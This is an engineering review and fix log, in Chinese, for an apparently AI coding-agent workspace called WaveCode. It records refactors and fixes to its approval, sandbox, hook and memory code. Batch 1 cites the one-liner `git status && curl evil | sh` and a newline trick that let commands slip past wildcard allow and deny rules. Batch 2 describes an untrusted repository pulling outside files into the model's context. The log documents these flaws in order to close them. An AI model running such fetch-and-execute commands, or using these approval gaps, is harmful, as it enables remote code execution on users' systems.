# 架构脱耦审查与修复日志(2026-08-28)

> 参照 voyager 项目架构文档的"脱耦铁律"对 WaveCode workspace 做全面审查后
> 的修复记录。铁律取其精神:**依赖单向、只经契约/机制通信、文件级单一职责、
> 命名中性、权限即工具面、无静默回退**。
>
> 分支:`refactor/architecture-nested-layers`;所有修复均通过 `cargo test --workspace`
> 全量回归(基线全绿,修复后无回归)。

---

## 一、审查结论(总体)

| 维度 | 结论 |
|---|---|
| Cargo 依赖方向 | ✅ 健康。foundation(零内部依赖)← capabilities ← engine ← transport ← frontends,单向无循环;capabilities 各 crate 互不依赖 |
| 分层边界 | ✅ 基本干净。foundation 无上层词汇行为耦合;llm/protocol/config 纪律良好 |
| 主要违例 | ⚠ 集中在:巨型内联测试墙(session/mod.rs 3655 行,88% 是测试)、前端旁路(/memory 双实现)、装配根归属(cli bootstrap 独揽) |
| 代码质量 | 测试覆盖充分(审批门/状态机/流解析均有锁定);锁与中断安全点纪律良好 |

## 二、修复清单(按批次)

### 批次 1 — 高严重度 bug(cc763d9 / df13903)

**refactor: session 测试墙外移与事件助手归位**(先行为后续修复清场,纯移动零行为变更)

- `session/mod.rs` 3655 行 → 248 行:约 3236 行内联测试外移至 `session/tests/mod.rs`;
- 事件 helper(emit / fail_turn / rejection_content / output_or_err /
  is_prompt_too_long / emit_hook_warnings)独立为 `session/events.rs`;
- `RoundBlocks` 流式块累积器归位 `turn.rs`(唯一编排使用者);turn 循环常量
  随迁唯一使用者(`turn.rs` / `tool_dispatch.rs`)。

**fix: 子代理审批挂死与沙箱通配跨分隔符**

1. **子代理审批永久挂死(高)**:`subagent/manager.rs` 的 drain 任务丢弃除
   终态外的全部子代理事件(含 `ApprovalRequested`),而子代理 Session 有独立
   审批槽——default 权限模式下子代理调非只读工具即 park 在无人 `decide` 的
   槽上;同步形态下**整个父会话永久挂死**。存量测试全用 BypassPermissions,
   故从未暴露。
   修复:`SessionConfig` 新增 `unattended` 语义,子代理 `child_config` 置位;
   Ask 判定直接以 is_error 拒绝回灌(不发幻影审批事件、不 park)。权限不放宽——
   把"等不到的人工审批"显式拒绝,模型可改用只读路径或收尾汇报。审批冒泡到
   父会话留作后续增强(见待办 5)。
2. **sandbox 通配 `*` 跨命令分隔符(高,安全)**:规则按命令全文通配匹配,
   `*` 可跨越 `&&` / `;` / `|` / 换行——`Bash(git *)` 会把
   `git status && curl evil | sh` 一并免审批放行;deny 规则可被前缀伪装绕过
   (`echo hi\ncurl …` 不匹配 `Bash(curl *)` 的整条前缀,bypass 下 deny 是
   唯一防线)。
   修复:引入复合命令分隔符语义——deny 整条**与逐段**都匹配(任一段命中即拒);
   allow 通配规则不放行复合命令,仅 `allow_always` 派生的**字面精确**规则可豁免
   (用户审批过的完整命令)。反引号与 `$(` 同为切割点,命令替换内容独立成段参与
   deny 匹配。

### 批次 2 — 中严重度 bug(626655a)

- **hooks stdin 写入在超时窗口外**:`write_all` 在 `timeout(wait_with_output)`
  之前执行,载荷超管道缓冲(~64KB)且 hook 进程不读 stdin 时无限阻塞,
  `timeout_ms` 完全失效(整个 turn 挂死)。修复:写入与等待整体纳入 timeout,
  超时 drop future 经 kill_on_drop 杀进程。
- **hooks `once` 在 spawn 失败时被消耗**:额度在 `run_command` 之前扣减,
  命令不存在时 hook 从未执行却永久失效。修复:SpawnFailed 分支返还额度
  (超时视为已执行,额度照常消耗)。
- **memory `@ref` 无路径约束(安全)**:`WAVECODE.md` 的 `@path` 引用不拒绝
  绝对路径与 `..`——克隆来的不可信仓库可把 cwd 外任意文件读进模型上下文。
  修复:信任边界校验(仅 base_dir 内相对路径;拒绝 Prefix/RootDir/ParentDir
  组件),被拒引用按字面保留(与缺失文件同策略,诚实呈现)。
- **actor 空闲路径中断盲区**:无活动 turn 的 `/compact` 与 slash 直调 skill
  直接 `.await`(前者是一次 LLM 调用,后者是完整 turn),期间 Interrupt /
  Shutdown / 审批回填 / 模式切换全部堵在通道里。修复:新增
  `drive_idle_operation`,与 in-turn 同纪律经 `select!` 持续监听 submission。
- **每 turn 预取记忆提取句柄导致历史深克隆**:预取句柄长期持有历史 `Arc`,
  本 turn 首次 `push_message` 的 `Arc::make_mut` 退化为整历史深克隆(违背
  O(1) 快照不变量;仅配置 memory 的会话受影响,故测试未暴露)。修复:删除
  预取,Shutdown 时 turn future 出借用后经 `spawn_memory_extraction` 现取
  ——提取素材从"turn 前快照"变为**会话终态历史**(含被中断 turn 的部分
  结果,是行为改进,非退化;注释已如实更新)。

### 批次 3 — 低严重度 bug(b3b2c89)

- `task_stop` 对已自行完成的任务如实回报"停止未生效",不再统一输出 stopped
  (曾误导模型以为停止动作生效);
- rollout 读取失败时不再以序号 1 续写既有文件(防重号记录损坏 replay 恢复;
  读写一致性优先:读不了就不写,会话降级为不持久化);
- grep 命中上限跳出前把当前文件计入文件数(统计尾行曾少算一个);
- glob/grep 的 cwd 前缀按 glob 语法转义元字符(含 `[ ]` 的目录曾恒空结果);
- `edit_file` / `write_file` 对目录路径返回可自我纠正的业务文案,对齐
  `read_file` 分流形态(crate 约定:业务失败走 is_error 结果,Err 仅实现级);
- skills catalog 预算改按**字符**口径比较(原按字节,中文描述提前两三倍
  触发降级截断);
- SSE `message_delta` 的 `usage` 字段 `#[serde(default)]`(第三方兼容网关
  省略 usage 时不再终止整条流、丢弃已生成文本)。

### 批次 4 — 脱耦整理(e628df3 / 40f5581)

- **tui 导出面收窄**:`app` / `markdown` / `text` / `ui` 不再 `pub`,导出面
  只留 `run` + `TuiContext`(cli 实际用法即此,内部实现不属于公共 API);
- **tools 导出纪律统一**:`todo_tool` 改私有模块 + `pub use`,与其他工具
  模块一致(原先同一文件两种纪律);
- **命名中性**:cli 的 `wave.rs`(品牌波形措辞)改名 `banner.rs`,引用点
  同步;
- **日志可观测**:事件接收端断开的日志 debug 升 warn(异常路径需可见);
- **/memory 双实现统一**:cli 删除 `MemoryStore` 现场构造,与 tui 同一装配
  形态(注入索引路径直读);tui 索引文件不存在与空索引同态(消漂移:cli
  显示"暂无"、tui 曾显示错误)。

## 三、已识别、本轮不动的待办(按优先级)

1. **装配根收口(中,建议下一轮)**:cli `bootstrap.rs` 是唯一生产装配根,
   依赖边纪律自相矛盾——hooks/mcp 经 core 桥、memory/skills/tools/sandbox
   直连。建议 core/app-server 提供统一装配入口(如
   `SessionConfig::from_config(Config, cwd)`),cli 退化为参数解析;`home_dir`
   错位在 memory crate(bootstrap 复用)随之自然消解。结论需写回 SPEC §3 矩阵。
2. **/memory 与 resume 协议化(中)**:读记忆索引与 `wavecode resume` 列表
   均无协议面 Op——Web/Desktop 前端无法复用。随新前端需求一并决策。
3. **SessionStart/SessionEnd hooks 下移 core(中,行为归属)**:当前由 cli
   三个入口 6 处各自触发(core `hooks.rs` 注释声明为有意识决策)。新前端
   出现时要么重实现要么静默丢失 hooks,建议下移到 actor 的会话启动 /
   Shutdown 路径(与记忆提取同点)。
4. **protocol/config 承载引擎词汇(低,设计张力)**:foundation 的协议类型
   直接命名 subagent / compact / slash / turn 等引擎概念,但 protocol 定位
   是"前后端契约唯一事实源",词汇上浮有内在必然且均为纯类型。建议在 SPEC
   §3 依赖矩阵明文豁免 protocol / config,而非改名(重构中途不值得付出
   波及成本)。
5. **子代理审批冒泡(增强)**:unattended 拒绝是止血;更完整的形态是把子
   代理的 `ApprovalRequested` 经 drain 转发到父事件流、审批槽按会话共享,
   由父 actor 统一路由——需要 drain 持有父事件通道,改动面中等。
6. **连续同角色 user 消息合并(低,第三方端点兼容)**:官方 API 自动合并,
   强制角色交替的第三方网关会对 compact 摘要请求 400。如需支持该类网关,
   在序列化前合并相邻同角色消息即可。
7. **双 markdown 渲染器(低,已知决策)**:cli 与 tui 各持一份"同源不同形"
   的重写(tui 不能依赖 cli),漂移已现(tui 表格退化为纯文本)。可接受;
   后续可抽共享纯语义解析层,输出侧各留投影。
8. **内联测试墙通病(约定缺失)**:本轮回迁了 session 一处;workspace 其余
   大文件(app-server/lib.rs、subagent/mod.rs、context/lib.rs 等)测试占比
   高但生产段职责内聚,建议制定 `#[path = "xxx_tests.rs"]` 或 tests/ 子目录
   约定,随文件触碰渐进执行。

## 四、验证记录

- 全流程 `cargo test --workspace` 全绿(基线与每批次后均验证);
- 新增回归测试 11 项:子代理 unattended 配置、同步子代理拒绝收尾(5s 超时
  证明不挂死)、unattended 会话无审批事件、sandbox 分段切割、deny 段匹配、
  allow 通配不放行复合命令、allow_always 精确豁免、@ref 越界不展开、
  glob 元字符目录可命中、skills 字符口径截断链;
- 修复不引入新警告(`cargo build --workspace` 0 warning)。

## 五、遗留声明

- 批次 2 的提取语义变化（快照 → 终态）与批次 1 的子代理审批行为变化
  （挂死 → 显式拒绝）是**用户可见行为变更**，已在上文如实标注；
- `.zcode/`、`docs/wavecode-*` 等未跟踪文件非本次工作产物，未纳入提交。

---

# 第二轮：遗留待办修复（2026-08-28 同日续）

> 第三节待办逐项处置。全部通过 `cargo test --workspace` 全量回归（0 警告）。

## 六、处置总表

| 待办 | 处置 | commit |
|---|---|---|
| 6. 连续同角色 user 消息合并 | ✅ 修复 | 86ae7e3 |
| 2. /memory 协议化 | ✅ 落地 | ec6ae66 |
| 1. 装配根收口 + home_dir 单点化 | ✅ 落地 | 76c6ce6 |
| 3. SessionStart/End hooks 下移 | ✅ 收口 actor | 4bd2089 |
| 5. 子代理审批冒泡 | ✅ 落地（取代 unattended） | 693bd38 |
| 4. protocol/config 词汇豁免 | ✅ 决策落 SPEC §3 规则 4 | 5a113b8 |
| 8. 内联测试墙约定 | ✅ 落 SPEC §18 | 5a113b8 |
| 7. 双 markdown 渲染器 | ✅ 语义对齐清单落 SPEC §15.6（接受现状） | 5a113b8 |
| 2. resume 协议化 | ❌ 决策不做（恢复在 actor 之前，无协议面对象；落 SPEC §3 规则 4） | 5a113b8 |

## 七、各项修复说明

### 7.1 连续同角色 user 消息合并（86ae7e3，fix）

`anthropic.rs` 的 `build_request_body` 序列化前合并相邻同角色消息：历史末条
tool_result（user）+ 追加指令（user）是压缩摘要/上下文采样管线的常态产物，
强制角色交替的第三方兼容网关对此返回 400。合并 = content 块串联，相邻 Text
补换行防粘连；官方端点行为不变。

### 7.2 /memory 读取面协议化（ec6ae66，feat）

- protocol 新增 `Op::MemoryList` 与 `EventMsg::MemoryIndex { path, content }`
  （wire tag 锁定测试同步登记）；
- core `Session::memory_index()` 现读存储（索引不存在 = 空串，正常形态）；
- tui 与 cli repl 均改走协议面（tui 删 `TuiContext.memory_index_path` 注入，
  repl 删直读实现）——Web/Desktop 前端获得等价能力，`/memory` 双实现问题
  从根上消除（不再是"统一注入形态"而是"只剩协议面一种"）。

### 7.3 装配根收口（76c6ce6，refactor）

- cli `bootstrap.rs` 整体上移为 `core::assemble::load_boot`——装配是引擎
  职责，第二个前端出现时零复制复用；
- 装配警告不再直接打 stderr：收集进 `Boot.warnings`，呈现由调用方决定
  （core 库不侵入输出流）；
- `home_dir` 单点化至 `config::home_dir()`（memory/cli 重复实现删除）；
- **cli 内部依赖收敛为 app-server + config + core + protocol + tui**，
  删除 llm/tools/sandbox/memory/skills 五条直连边——"hooks/mcp 走 core 桥
  而 memory/skills 直连"的矩阵纪律矛盾以"全部经 core"收口；
- 新增 home 缺失/提供两组装配测试（cwd/home 参数化后可注入 tempdir）。

### 7.4 SessionStart/SessionEnd hooks 收口 actor（4bd2089，refactor）

- core 新增 `Session::run_lifecycle_hook(point)` 单点执行（返回警告文案）；
- app-server actor：SessionStart 在循环入口触发，SessionEnd 在全部四个优雅
  退出路径触发（in-turn Shutdown / idle Shutdown / idle 长操作中 Shutdown /
  submission 通道关闭）；警告经 Warning 事件进事件流；
- cli 六处触发调用与 `run_lifecycle_hooks` 函数删除；exec 关闭时排干事件流
  （5s 上限）保证 SessionEnd 警告可见后才退出；
- 前端只经协议面交互——新前端零成本获得生命周期 hooks（能力等价达成）。

### 7.5 子代理审批冒泡（693bd38，feat）

- 子代理 Session 共享父会话审批槽（`SubagentManager::set_approval_gate` 注入；
  `from_config` 自建兜底槽承接无头形态）；call_id 键控，父子不冲突；
- drain 侧转发 `ApprovalRequested` 到父事件流（`try_emit_event` 返回是否
  真正发出）；事件汇未挂接（无头/测试形态）时立即以 Deny 落槽 **fail-fast**
  ——子代理不 park 挂死；
- `SessionConfig.unattended`（第一轮批次 1 的止血方案）由"共享槽 + 冒泡 +
  fail-fast"取代并删除；
- 行为变化：default 模式下交互前端的子代理写操作从**无条件拒绝**变为
  **正常弹审批**；无头形态保持拒绝。新增冒泡端到端测试（事件汇挂接 +
  独立任务应答 AllowOnce → 工具执行 → 收尾）。

### 7.6 SPEC 决策备案（5a113b8，docs）

- §3 规则 4：protocol/config 的引擎词汇**明文豁免**（契约层词汇上浮有内在
  必然，纯类型无行为耦合，不做中性改名）；resume 不做协议化；
- §15.6：双 markdown 渲染器的语义对齐清单（块级/行内/转义契约；tui 表格
  退化纯文本为已声明差异）；
- §18：内联测试墙约定（>500 行外移，触碰渐进执行，首个样本 session/mod.rs）。

## 八、第二轮用户可见行为变更（如实声明）

1. **子代理审批**：default 模式下子代理的写/执行操作现在会向前端弹审批
   （此前无条件拒绝）；无头形态仍自动拒绝；
2. **生命周期 hook 警告改走事件流**：SessionStart/End 的 hook 警告从 stderr
   变为 Warning 事件——TUI 中显示在消息流；`exec --json` 的 JSONL 中会多出
   Warning 事件（JSONL 消费者需知晓）；
3. **exec 退出时序**：现排干事件流直到 actor 退出（5s 上限），保证 SessionEnd
   警告呈现后才退出；
4. `/memory` 在 tui/repl 中改为异步协议往返（外观行为不变）。
